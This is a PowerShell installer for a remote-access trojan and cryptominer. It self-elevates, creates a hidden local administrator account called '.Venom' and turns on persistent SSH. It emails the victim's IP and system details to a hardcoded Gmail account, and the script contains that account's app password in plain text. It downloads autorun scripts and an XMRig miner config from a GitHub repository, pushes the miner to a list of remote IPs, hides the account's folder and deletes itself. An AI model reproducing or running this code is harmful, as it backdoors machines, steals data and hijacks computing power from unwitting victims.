# builds resources for RAT

# random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}


#create admin

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Exit
} else {
    # Create a new local admin account
    $username = ".Venom"
    $password = ConvertTo-SecureString ".V3n0m" -AsPlainText -Force
    New-LocalUser $username -Password $password -FullName ".Venom" -Description "Local admin account created via PowerShell"
    Add-LocalGroupMember -Group "Administrators" -Member $username
}


## variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location

# Load email and password from text files
$email = "goat3dmofo@gmail.com"
$pword = "qcihadixhgspywjw"

# Retrieve the correct network interface alias
$interfaceAlias = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).InterfaceAlias

# Retrieve the IP address for the active network interface
$IP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interfaceAlias).IPAddress

# Ensure other variables are correctly defined
$path = "$env:temp/$wd"
$configfile = "$env:UserName.rat"

# Overwrite or create a new configuration file
Set-Content -Path $configfile -Value ""

# Add the content to the configuration file
Add-Content -Path $configfile -Value $IP
Add-Content -Path $configfile -Value $password
Add-Content -Path $configfile -Value $path

# Convert SecureString to plain text (understand security risks)
$password = ConvertTo-SecureString $pword -AsPlainText -Force
$plainPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($password))
Add-Content -Path $configfile -Value $plainPassword

Add-Content -Path $configfile -Value $path

# Send the email with the configuration file details
Send-MailMessage `
    -From $email `
    -To $email `
    -Subject "IP Address Notification from $env:UserName" `
    -Attachment $configfile `
    -SmtpServer "smtp.gmail.com" `
    -Port 587 `
    -UseSsl `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $plainPassword -AsPlainText -Force))

Remove-Item $configfile

#goto temp, make working dir
mkdir $path
cd $path
# mv $initial_dir/smtp.txt ./smtp.ps1
#./smtp.ps1

# registry to hide  local admin
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg -OutFile "wrev.reg"

#visual basic scrit to download the registry
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs -OutFile "calty.vbs"

#Download modified config.json
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/config.json -OutFile "config.json"

#Download Autorun starter
Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs -OutFile "RunHidden.vbs"

#Download Ip list
Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/Ips.txt -OutFile "Ips.txt"


# enabling  persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

#install the registry
./wrev.reg; ./calty

# Path to the PowerShell wrapper script
$runHiddenWrapperPath = "$initial_dir\RunHidden.ps1"

# Move RunHidden.vbs to the initial directory
mv $path\RunHidden.vbs $initial_dir

Start-Sleep -Seconds 30

# Run the wrapper script to execute RunHidden.vbs with elevated privileges
Start-Process powershell -ArgumentList "-File `"$runHiddenWrapperPath`" -vbsPath `"$initial_dir\RunHidden.vbs`"" -Verb runAs

#Create rig Folder within Folder
New-Item -Name "$wd" -Path "$path" -ItemType Directory
cd $wd

# Get the current directory
$currentDirectory = $PWD

# Download the ZIP file
Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig-6.22.2-msvc-win64.zip"

# Extract the ZIP file in the current directory
Expand-Archive -Path "$currentDirectory\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$currentDirectory"

# Verify extraction
Get-ChildItem -Path $currentDirectory

#replace config.json
$newConfigPath = "$path\config.json"
$targetConfigPath = "$currentDirectory\xmrig-6.22.2\config.json"

if (Test-Path -Path $newConfigPath) {
    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
    Write-Output "Config.json file has been replaced successfully."
} else {
    Write-Output "New config.json file not found at the specified path."
}

# Define the path to the text file with IP addresses
$ipFile = "$path\Ips.txt"

# Define the path to XMRig executable
$xmrPath = "$currentDirectory\xmrig.exe"

# Define the configuration file path
$configPath = "$currentDirectory\config.json"

# Send the email with Rig Status
Send-MailMessage `
    -From $email `
    -To $email `
    -Subject "XMRig Execution Status from $env:UserName" `
    -Body "Xmrig Process Starting..." `
    -SmtpServer "smtp.gmail.com" `
    -Port 587 `
    -UseSsl `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $pword -AsPlainText -Force))

# Read the IP addresses from the text file
$ips = Get-Content -Path $ipFile

foreach ($ip in $ips) {
    try {
        Write-Output "Processing IP: $ip"
        
        # Command to start XMRig with the configuration file
        $command = "$xmrPath -c $configPath"

        # Execute the command on the remote computer with elevated privileges
        Invoke-Command -ComputerName $ip -ScriptBlock {
            param($command)
            Start-Process -FilePath "PowerShell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -Verb RunAs
        } -ArgumentList $command

        Write-Output "XMRig started on IP: $ip"
        Send-MailMessage `
            -From $email `
            -To $email `
            -Subject "XMRig Execution Success" `
            -Body "XMRig has successfully started on IP: $ip" `
            -SmtpServer "smtp.gmail.com" `
            -Port 587 `
            -UseSsl `
            -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $pword -AsPlainText -Force))
    } catch {
        Write-Output "Error processing IP: $ip"
        Send-MailMessage `
            -From $email `
            -To $email `
            -Subject "XMRig Execution Failure" `
            -Body "Failed to start XMRig on IP: $ip" `
            -SmtpServer "smtp.gmail.com" `
            -Port 587 `
            -UseSsl `
            -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $pword -AsPlainText -Force))
    }
}

Write-Output "Script execution completed"
Send-MailMessage `
    -From $email `
    -To $email `
    -Subject "Script Execution Completed" `
    -Body "The script has finished executing. Please check the status of each IP address." `
    -SmtpServer "smtp.gmail.com" `
    -Port 587 `
    -UseSsl `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, (ConvertTo-SecureString -String $pword -AsPlainText -Force))



# hide venom user
# Navigate to the C:\Users directory
Set-Location -Path 'C:\Users'

# Check if .Venom directory exists
if (Test-Path -Path '.Venom' -PathType Container) {
    # Set hidden, system, and read-only attributes to .Venom
    attrib +h +s +r .Venom
    Write-Output ".Venom directory attributes set to hidden, system, and read-only"
} else {
    Write-Output ".Venom directory does not exist"
    exit 1
}

# start rig
#powershell -windowstyle hidden -ExecutionPolicy Bypass ./start.cmd


# self delete
cd $initial_dir



del installer.ps1

